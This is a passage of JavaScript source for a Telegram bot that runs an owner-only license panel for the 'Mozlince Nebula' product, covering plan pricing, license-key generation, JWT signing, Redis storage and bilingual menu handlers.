const PACOTES = { '3d':{nome:'3 Dias',dias:3,preco:3,emoji:'◔',lifetime:false}, '7d':{nome:'7 Dias',dias:7,preco:5,emoji:'◕',lifetime:false}, '15d':{nome:'15 Dias',dias:15,preco:7,emoji:'◑',lifetime:false}, '30d':{nome:'30 Dias',dias:30,preco:12,emoji:'◒',lifetime:false}, '45d':{nome:'45 Dias',dias:45,preco:17,emoji:'◓',lifetime:false}, '90d':{nome:'3 Meses',dias:90,preco:30,emoji:'✦',lifetime:false}, '180d':{nome:'6 Meses',dias:180,preco:45,emoji:'✧',lifetime:false}, '1a':{nome:'1 Ano',dias:365,preco:70,emoji:'⟡',lifetime:false}, 'life':{nome:'LIFETIME',dias:36500,preco:190,emoji:'∞',lifetime:true} };
const precoFmt = usd => `$${Number(usd).toFixed(2)}`;

function migrarLicenca(lic) {
  if (!lic || typeof lic !== 'object') return lic;
  const n = { ...lic };
  if (!n.plano && n.plan) n.plano = n.plan === 'premium' ? 'life' : n.plan;
  if (!n.plano) n.plano = '30d';
  const pk = PACOTES[n.plano];
  if (!n.planoNome) n.planoNome = pk ? pk.nome : 'Premium';
  if (typeof n.dias !== 'number') n.dias = pk ? pk.dias : 30;
  n.lifetime = n.plano === 'life';
  n.ilimitada = n.lifetime;
  if (!n.criadaEm && n.createdAt) n.criadaEm = n.createdAt;
  if (!n.criadaEm) n.criadaEm = Date.now();
  if (!n.expiraEm || (typeof n.expiraEm !== 'number')) { n.expiraEm = n.lifetime ? n.criadaEm + (100 * 365 * 24 * 60 * 60 * 1000) : n.criadaEm + (n.dias * 24 * 60 * 60 * 1000); }
  if (typeof n.ativa !== 'boolean') n.ativa = typeof n.active === 'boolean' ? n.active : true;
  if (typeof n.preco === 'string') n.preco = parseFloat(n.preco.replace(/[^\d.,]/g,'').replace(',','.')) || 0;
  if (!n.preco) n.preco = pk ? pk.preco : 0;
  n.preco_usd = n.preco; n.preco_fmt = precoFmt(n.preco);
  return n;
}

function buildClaims(installId, lic) {
  const now = Math.floor(Date.now()/1000);
  const isLife = lic && lic.plano === 'life';
  const exp = isLife ? now + (100 * 365 * 24 * 60 * 60) : Math.floor((lic.expiraEm || (lic.criadaEm + lic.dias*86400000)) / 1000);
  const ent = buildEntitlement(lic, installId);
  return { sub: installId, iss: 'asheo.api', aud: 'mozlince-client', installId, plan: ent.plan, planDisplayName: ent.planDisplayName, tier: ent.tier, kind: 'premium', status: ent.status, active: ent.status === 'active', isPremium: ent.tier === 'premium', isVerified: true, source: 'premium', sourceType: 'server', isFounder: false, lifetime: isLife, plano: lic.plano, licenseKey: lic.chave, issuedAt: lic.criadaEm, expiresAt: lic.expiraEm, scope: PREMIUM_SCOPE, features: mapFeatures(true), capabilities: mapCapabilities(true), limits:{...PREMIUM_LIMITS}, secret: crypto.createHash('sha256').update(installId + (lic.chave || '')).digest('hex'), iat: now, nbf: now-5, exp, jti: crypto.randomUUID() };
}
function signToken(claims){ if(!PRIVATE_KEY)throw new Error('Chave privada nao inicializada'); return jwt.sign(claims, PRIVATE_KEY, { algorithm:'ES256' }); }
function formatDate(ts){ if(!ts)return 'Nunca'; return new Date(ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit'}); }
function humanTime(ms){ if(ms<=0)return '✕ expirada'; const s=Math.floor(ms/1000), d=Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60); if(d>0)return `${d}d ${h}h ${m}m`; if(h>0)return `${h}h ${m}m`; return `${m}m`; }
function progressBar(pct, size=10){ pct = Math.max(0, Math.min(100, pct)); const cheio = Math.round(pct*size/100); return '▰'.repeat(cheio) + '▱'.repeat(size-cheio); }
function generateLicenseKey(){ const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; const b=()=>{let s='';for(let i=0;i<4;i++)s+=chars[crypto.randomInt(0,chars.length)];return s;}; return `ASHEO-${b()}-${b()}-${b()}-${b()}`; }
function validateBearer(req){ const auth=req.headers['authorization']||''; if(!auth.startsWith('Bearer '))return {ok:false,error:'missing_bearer'}; try{ const d=jwt.verify(auth.substring(7),PUBLIC_KEY||PRIVATE_KEY,{algorithms:['ES256'],clockTolerance:30}); return {ok:true,decoded:d}; } catch(e){ return {ok:false,error:e.message}; } }

const T = { pt: { menu_title:'⌬  PAINEL DE CONTROLE', menu_sub:'Selecione uma operação abaixo', online:'online', secure:'seguro', btn_generate:'⚡  Gerar Licença', btn_mykeys:'◈  Minhas Chaves', btn_stats:'◧  Estatísticas', btn_link:'⟡  Vincular', btn_unlink:'⌬  Desvincular', btn_query:'◉  Consultar', btn_prices:'✦  Tabela de Preços', btn_support:'✆  Suporte', btn_lang:'◐  Idioma / Language', btn_help:'?  Ajuda', btn_danger:'⚠  Zona de Perigo', btn_back:'‹  Voltar', btn_menu:'‹  Menu', btn_refresh:'↻  Atualizar', btn_cancel:'✕  Cancelar', btn_confirm_yes:'✓  Sim, confirmar', btn_confirm_no:'✕  Cancelar', welcome_title:'Bem-vindo ao Mozlince Nebula', welcome_desc:'Para adquirir uma licença premium, clique abaixo:', contact:'✆  CONTACTAR SUPORTE', support_title:'✆  Suporte', support_write:'Escreva sua mensagem agora:', support_hint:'(o próximo texto será encaminhado ao suporte)', support_exp:'Sessão expira em 10 minutos', support_sent:'✓  MENSAGEM ENVIADA', support_sent_desc:'Sua mensagem foi encaminhada.\nTempo de resposta: até 24h', support_cancelled:'✕  Suporte cancelado', gen_title:'⚡  Gerar Licença', gen_sub:'Escolha um plano abaixo:', gen_success:'✓  LICENÇA EMITIDA', gen_key:'Chave', gen_plan:'Plano', gen_price:'Preço', gen_issued:'Emitida', gen_expires:'Expira', gen_duration:'Duração', gen_lifetime:'Lifetime', gen_never:'Nunca', gen_yes:'Sim', gen_no:'Não', list_title:'◈  Minhas Licenças', list_empty:'Nenhuma licença cadastrada.', list_more:'+{n} ocultas', stats_title:'◧  Estatísticas', stats_total:'Total', stats_active:'Ativas', stats_expired:'Expiradas', stats_linked:'Vinculadas', stats_lifetime:'Lifetime', stats_revenue:'Receita', stats_rate:'Taxa ativa', detail_title:'◉  Detalhes da Licença', detail_key:'Chave', detail_status:'Status', detail_active:'● Ativa', detail_revoked:'○ Revogada', detail_install:'Install ID', detail_not_linked:'não vinculada', detail_remaining:'Restante', act_link:'⟡ Vincular', act_unlink:'⌬ Desvincular', act_revoke:'✕ Revogar', act_delete:'✕ Deletar', prices_title:'✦  Tabela de Preços', prices_currency:'USD (Dólar Americano)', help_title:'?  Central de Ajuda', help_cmds:'Comandos disponíveis', danger_title:'⚠  Zona de Perigo', danger_warn:'Ações irreversíveis', danger_del_active:'Deletar apenas ativas', danger_del_all:'Deletar TODAS as licenças', danger_confirm_active:'Deletar todas as licenças <b>ativas</b>?', danger_confirm_all:'⚠ DELETAR TODAS as licenças? Esta ação é irreversível.', danger_done:'{n} licenças removidas.', lang_select:'Escolha seu idioma / Choose your language:', lang_saved:'✓ Idioma atualizado', status_active:'● Ativa', status_revoked:'○ Revogada', status_expired:'✕ Expirada', expired_msg:'Esta licença expirou. Renove para continuar.' }, en: { menu_title:'⌬  CONTROL PANEL', menu_sub:'Select an operation below', online:'online', secure:'secure', btn_generate:'⚡  Generate License', btn_mykeys:'◈  My Keys', btn_stats:'◧  Statistics', btn_link:'⟡  Link', btn_unlink:'⌬  Unlink', btn_query:'◉  Query', btn_prices:'✦  Price List', btn_support:'✆  Support', btn_lang:'◐  Language / Idioma', btn_help:'?  Help', btn_danger:'⚠  Danger Zone', btn_back:'‹  Back', btn_menu:'‹  Menu', btn_refresh:'↻  Refresh', btn_cancel:'✕  Cancel', btn_confirm_yes:'✓  Yes, confirm', btn_confirm_no:'✕  Cancel', welcome_title:'Welcome to Mozlince Nebula', welcome_desc:'To purchase a premium license, click below:', contact:'✆  CONTACT SUPPORT', support_title:'✆  Support', support_write:'Write your message now:', support_hint:'(the next text will be forwarded to support)', support_exp:'Session expires in 10 minutes', support_sent:'✓  MESSAGE SENT', support_sent_desc:'Your message was forwarded.\nResponse time: up to 24h', support_cancelled:'✕  Support cancelled', gen_title:'⚡  Generate License', gen_sub:'Choose a plan below:', gen_success:'✓  LICENSE ISSUED', gen_key:'Key', gen_plan:'Plan', gen_price:'Price', gen_issued:'Issued', gen_expires:'Expires', gen_duration:'Duration', gen_lifetime:'Lifetime', gen_never:'Never', gen_yes:'Yes', gen_no:'No', list_title:'◈  My Licenses', list_empty:'No licenses found.', list_more:'+{n} hidden', stats_title:'◧  Statistics', stats_total:'Total', stats_active:'Active', stats_expired:'Expired', stats_linked:'Linked', stats_lifetime:'Lifetime', stats_revenue:'Revenue', stats_rate:'Active rate', detail_title:'◉  License Details', detail_key:'Key', detail_status:'Status', detail_active:'● Active', detail_revoked:'○ Revoked', detail_install:'Install ID', detail_not_linked:'not linked', detail_remaining:'Remaining', act_link:'⟡ Link', act_unlink:'⌬ Unlink', act_revoke:'✕ Revoke', act_delete:'✕ Delete', prices_title:'✦  Price List', prices_currency:'USD (US Dollar)', help_title:'?  Help Center', help_cmds:'Available commands', danger_title:'⚠  Danger Zone', danger_warn:'Irreversible actions', danger_del_active:'Delete active only', danger_del_all:'Delete ALL licenses', danger_confirm_active:'Delete all <b>active</b> licenses?', danger_confirm_all:'⚠ DELETE ALL licenses? This action is irreversible.', danger_done:'{n} licenses removed.', lang_select:'Choose your language / Escolha seu idioma:', lang_saved:'✓ Language updated', status_active:'● Active', status_revoked:'○ Revoked', status_expired:'✕ Expired', expired_msg:'This license expired. Renew to continue.' } };
function t(lang, key, vars={}) { let s = (T[lang] || T.pt)[key] || T.pt[key] || key; for (const k in vars) s = s.replace(`{${k}}`, vars[k]); return s; }

const SUPPORT_SESSIONS = new Map();
const USER_LANG = new Map();
setInterval(() => { const now = Date.now(); for (const [k,v] of SUPPORT_SESSIONS.entries()) if (now - v.ts > 10*60*1000) SUPPORT_SESSIONS.delete(k); }, 60000);
const TG_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
async function tgSend(chatId, text, keyboard=null) { try { const body={chat_id:chatId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){ log('TG','send erro: '+e.message); } }
async function tgEdit(chatId, messageId, text, keyboard=null) { try { const body={chat_id:chatId,message_id:messageId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; await fetch(`${TG_API}/editMessageText`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){ log('TG','edit erro: '+e.message); } }
async function tgAnswer(id, text='') { try { await fetch(`${TG_API}/answerCallbackQuery`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:id,text})}); } catch {} }

function menuPrincipal(lang='pt') {
  const hora = new Date().toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' });
  return { texto: `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'menu_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◔</b> ${hora}   <b>◉</b> ${t(lang,'online')}   <b>⟡</b> ${t(lang,'secure')} ES256\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<i>${t(lang,'menu_sub')}</i>`, teclado: { inline_keyboard: [ [{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }], [{ text: t(lang,'btn_mykeys'), callback_data:'m_listar' }, { text: t(lang,'btn_stats'), callback_data:'m_stats' }], [{ text: t(lang,'btn_link'), callback_data:'m_vincular' }, { text: t(lang,'btn_unlink'), callback_data:'m_desvincular' }], [{ text: t(lang,'btn_query'), callback_data:'m_consultar' }], [{ text: t(lang,'btn_prices'), callback_data:'m_precos' }], [{ text: t(lang,'btn_support'), callback_data:'m_contacto' }], [{ text: t(lang,'btn_lang'), callback_data:'m_lang' }], [{ text: t(lang,'btn_help'), callback_data:'m_ajuda' }, { text: t(lang,'btn_danger'), callback_data:'m_perigo' }] ] } };
}
async function cmdStart(chatId, msgId=null) { const lang = USER_LANG.get(String(chatId)) || 'pt'; const m = menuPrincipal(lang); if (msgId) await tgEdit(chatId, msgId, m.texto, m.teclado); else await tgSend(chatId, m.texto, m.teclado); }

async function handleCallback(cb) {
  const chatId = cb.message.chat.id, msgId = cb.message.message_id, data = cb.data, userId = String(cb.from.id);
  const isOwner = userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  if (data === 'm_lang') { await tgAnswer(cb.id); const texto = `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>◐  ${t(lang,'lang_select')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>`; const kb = { inline_keyboard: [ [{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }], [{ text: t(lang,'btn_back'), callback_data:'m_home' }] ]}; await tgEdit(chatId, msgId, texto, kb); return; }
  if (data === 'lang_pt' || data === 'lang_en') { const novo = data === 'lang_pt' ? 'pt' : 'en'; USER_LANG.set(String(chatId), novo); await tgAnswer(cb.id, t(novo,'lang_saved')); const m = menuPrincipal(novo); await tgEdit(chatId, msgId, m.texto, m.teclado); return; }
  if (!isOwner) {
    if (data === 'm_contacto') { SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); await tgAnswer(cb.id, '✎'); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'support_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<b>✎</b> ${t(lang,'support_write')}\n<i>${t(lang,'support_hint')}</i>\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◔</b> ${t(lang,'support_exp')}`, { inline_keyboard: [[{ text: t(lang,'btn_cancel'), callback_data:'m_cancelar_suporte' }]] }); return; }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); await tgEdit(chatId, msgId, `<b>${t(lang,'support_cancelled')}</b>\n\n<i>${t(lang,'welcome_desc')}</i>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }]] }); return; }
    if (data === 'm_home') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>◈  ${t(lang,'welcome_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<i>${t(lang,'welcome_desc')}</i>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_lang'), callback_data:'m_lang' }]] }); return; }
    await tgAnswer(cb.id, '⛔'); return;
  }
  try {
    if (data === 'm_home') { await tgAnswer(cb.id); return cmdStart(chatId, msgId); }
    if (data === 'm_gerar') { await tgAnswer(cb.id, '⚡'); const kb = { inline_keyboard: [] }; const entries = Object.entries(PACOTES); for (let i = 0; i < entries.length; i += 2) { const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }]; if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` }); kb.inline_keyboard.push(linha); } kb.inline_keyboard.push([{ text: t(lang,'btn_back'), callback_data:'m_home' }]); let tabela = ''; for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias}d`; tabela += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>  <i>${dur}</i>\n`; } await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'gen_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>${t(lang,'gen_sub')}</i>\n\n${tabela}\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>`, kb); return; }
    if (data.startsWith('g_')) { const pk = data.substring(2), p = PACOTES[pk]; if (!p) { await tgAnswer(cb.id, '✕'); return; } const chave = generateLicenseKey(); const agora = Date.now(); const expira = p.lifetime ? (agora + 100*365*24*60*60*1000) : (agora + p.dias*24*60*60*1000); await redisSet(chave, JSON.stringify({ chave, plano: pk, planoNome: p.nome, preco: p.preco, preco_usd: p.preco, preco_fmt: precoFmt(p.preco), dias: p.dias, lifetime: p.lifetime === true, ilimitada: p.lifetime === true, criadaEm: agora, expiraEm: expira, ativa: true, installId: null, ativadaEm: null, v: 8 })); log('OK', `Chave ${pk} gerada: ${chave}`); await tgAnswer(cb.id, '✓'); const restaTxt = p.lifetime ? '∞  LIFETIME' : humanTime(p.dias*24*60*60*1000); const barra = p.lifetime ? '▰▰▰▰▰▰▰▰▰▰' : progressBar(100); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'gen_success')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<b>⌬  ${t(lang,'gen_key')}</b>\n<code>${chave}</code>\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>${p.emoji}</b>  <b>${t(lang,'gen_plan')}:</b>  <b>${p.nome}</b>\n<b>◆</b>  <b>${t(lang,'gen_price')}:</b>  <code>${precoFmt(p.preco)}</code>\n<b>◔</b>  <b>${t(lang,'gen_issued')}:</b>  ${formatDate(agora)}\n<b>◕</b>  <b>${t(lang,'gen_expires')}:</b>  ${p.lifetime ? `<b>${t(lang,'gen_never')}</b>` : formatDate(expira)}\n<b>⟡</b>  <b>${t(lang,'gen_duration')}:</b>  <b>${restaTxt}</b>\n<b>∞</b>  <b>${t(lang,'gen_lifetime')}:</b>  ${p.lifetime ? `✓ ${t(lang,'gen_yes')}` : `✕ ${t(lang,'gen_no')}`}\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<code>${barra}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_query'), callback_data:`c_${chave}` }],[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] }); return; }
    if (data === 'm_listar') { await tgAnswer(cb.id, '◈'); const keys = await redisKeys('ASHEO-*'); if (keys.length === 0) { await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'list_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>${t(lang,'list_empty')}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }],[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; } let txt = `<b>${t(lang,'list_title')}</b>  <code>(${keys.length})</code>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n`; const inlineKb = []; for (let i = 0; i < Math.min(keys.length, 15); i++) { const l = await redisGet(keys[i]); if (!l) continue; const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now()); const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○'); txt += `<b>${emoji}</b> ${l.installId?'⟡':'○'} <code>${keys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n\n`; inlineKb.push([{ text:`▸ ${keys[i].substring(0,18)}…`, callback_data:`c_${keys[i]}` }]); } if (keys.length > 15) txt += `<i>${t(lang,'list_more',{n:keys.length-15})}</i>\n`; inlineKb.push([{ text: t(lang,'btn_refresh'), callback_data:'m_listar' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]); await tgEdit(chatId, msgId, txt, { inline_keyboard: inlineKb }); return; }
    if (data === 'm_stats') { await tgAnswer(cb.id, '◧'); const keys = await redisKeys('ASHEO-*'); let ativas=0, expiradas=0, vinc=0, life=0, receita=0; for (const k of keys) { const l = await redisGet(k); if (!l) continue; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) expiradas++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; } const taxa = keys.length ? Math.round((ativas/keys.length)*100) : 0; await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'stats_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<b>◈</b>  <b>${t(lang,'stats_total')}:</b>  <code>${keys.length}</code>\n<b>●</b>  <b>${t(lang,'stats_active')}:</b>  <code>${ativas}</code>\n<b>○</b>  <b>${t(lang,'stats_expired')}:</b>  <code>${expiradas}</code>\n<b>⟡</b>  <b>${t(lang,'stats_linked')}:</b>  <code>${vinc}</code>\n<b>∞</b>  <b>${t(lang,'stats_lifetime')}:</b>  <code>${life}</code>\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◆</b>  <b>${t(lang,'stats_revenue')}:</b>  <code>${precoFmt(receita)}</code>\n<b>◔</b>  <b>${t(lang,'stats_rate')}:</b>  <b>${taxa}%</b>\n<code>${progressBar(taxa, 15)}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_refresh'), callback_data:'m_stats' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; }
    if (data === 'm_vincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'act_link')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<code>/activate &lt;installId&gt; &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_desvincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'act_unlink')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<code>/desvincular &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_consultar') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLince NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'btn_query')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<code>/status &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_precos') { await tgAnswer(cb.id); let txt = `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'prices_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n`; for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias} dias`; txt += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>\n      <i>${dur}</i>\n`; } txt += `\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<i>◆ ${t(lang,'prices_currency')}</i>`; await tgEdit(chatId, msgId, txt, { inline_keyboard: [[{ text: t(lang,'btn_support'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; }
    if (data === 'm_contacto') { await tgAnswer(cb.id, '✆'); SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'support_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n\n<b>✎</b> ${t(lang,'support_write')}\n<i>${t(lang,'support_hint')}</i>\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>◔</b> ${t(lang,'support_exp')}`, { inline_keyboard: [[{ text: t(lang,'btn_cancel'), callback_data:'m_cancelar_suporte' }]] }); return; }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); return cmdStart(chatId, msgId); }
    if (data === 'm_ajuda') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'help_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>${t(lang,'help_cmds')}:</b>\n\n<code>/start</code>           Menu\n<code>/gerar</code>           Gerar\n<code>/listar</code>          Listar\n<code>/stats</code>           Estatísticas\n<code>/status &lt;k&gt;</code>      Consultar\n<code>/activate &lt;i&gt; &lt;k&gt;</code>  Vincular\n<code>/desvincular &lt;k&gt;</code> Desvincular\n<code>/revogar &lt;k&gt;</code>    Revogar\n<code>/deletar &lt;k&gt;</code>    Deletar uma\n<code>/deletartudo</code>     Deletar TUDO\n<code>/resp &lt;id&gt; &lt;msg&gt;</code> Responder\n<code>/lang</code>            Idioma\n\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; }
    if (data === 'm_perigo') { await tgAnswer(cb.id, '⚠'); await tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>${t(lang,'danger_title')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n<b>⚠  ${t(lang,'danger_warn')}</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>`, { inline_keyboard: [[{ text: t(lang,'danger_del_active'), callback_data:'danger_ativas' }],[{ text: t(lang,'danger_del_all'), callback_data:'danger_tudo' }],[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; }
    if (data === 'danger_ativas') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.3.1</b>\n<i>Motor de Licenças Premium · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>\n\n<b>⚠  CONFIRMAR</b>\n<code>╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌</code>\n${t(lang,'danger_confirm_active')}`, { inline_keyboard: [[{ text: t(lang,'btn_confirm_yes'), callback_data:'confirm_ativas' }],[{ text: t(lang,'btn_confirm_no'), callback_data:'m_perigo' }]] }); }
